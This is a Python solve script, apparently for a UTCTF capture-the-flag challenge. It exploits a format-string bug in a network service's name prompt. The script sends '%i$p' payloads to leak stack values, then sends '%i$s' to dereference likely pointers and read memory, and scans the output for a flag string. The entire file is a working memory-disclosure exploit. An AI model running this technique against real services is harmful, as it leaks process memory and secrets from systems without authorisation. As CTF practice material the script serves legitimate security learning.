import re
import socket
import string
from typing import Optional

HOST = "challenge.utctf.live"
PORT = 7255
FLAG_RE = re.compile(r"[A-Za-z0-9_]*\{[^\n{}]{3,}\}")


def get_welcome_value(payload: str, timeout: float = 0.65) -> Optional[str]:
    try:
        s = socket.create_connection((HOST, PORT), timeout=2.0)
    except OSError:
        return None
    s.settimeout(timeout)
    try:
        try:
            banner = s.recv(4096).decode(errors="replace")
        except (TimeoutError, socket.timeout, OSError):
            return None
        if "Enter your name:" not in banner:
            return None
        s.sendall((payload + "\n").encode())

        out = ""
        for _ in range(4):
            try:
                data = s.recv(4096)
            except (TimeoutError, socket.timeout, OSError):
                break
            if not data:
                break
            out += data.decode(errors="replace")
            if "Play a hand?" in out:
                break

        m = re.search(r"Welcome to the table, (.*?)!", out, re.S)
        if not m:
            return None
        return m.group(1)
    finally:
        s.close()


def printable(s: str) -> str:
    return "".join(ch if ch in string.printable and ch not in "\r\n\t" else "." for ch in s)


def main() -> int:
    print("[*] Stage 1: leak stack args with %i$p")
    ptr_map: dict[int, str] = {}
    for i in range(1, 70):
        payload = f"%{i}$p"
        v = get_welcome_value(payload)
        if v is None:
            continue
        v = v.strip()
        ptr_map[i] = v
        if i % 10 == 0:
            print(f"    - scanned {i} offsets")

    for i in sorted(ptr_map):
        v = ptr_map[i]
        if v not in ("(nil)", "0x0"):
            print(f"[p] {i:3d}: {v}")

    print("\n[*] Stage 2: dereference candidate pointers with %i$s")
    candidates = []
    for i, v in ptr_map.items():
        if not v.startswith("0x"):
            continue
        try:
            n = int(v, 16)
        except ValueError:
            continue
        if n <= 0x1000:
            continue
        candidates.append(i)

    seen = set()
    for i in sorted(set(candidates)):
        payload = f"%{i}$s"
        v = get_welcome_value(payload, timeout=0.55)
        if not v:
            continue
        pv = printable(v)
        if len(pv) < 4:
            continue
        key = pv[:80]
        if key in seen:
            continue
        seen.add(key)
        print(f"[s] {i:3d}: {pv[:220]}")
        m = FLAG_RE.search(v)
        if m:
            print(f"[+] FLAG FOUND: {m.group(0)}")
            return 0

    print("[!] No direct flag string leaked in scanned offsets.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())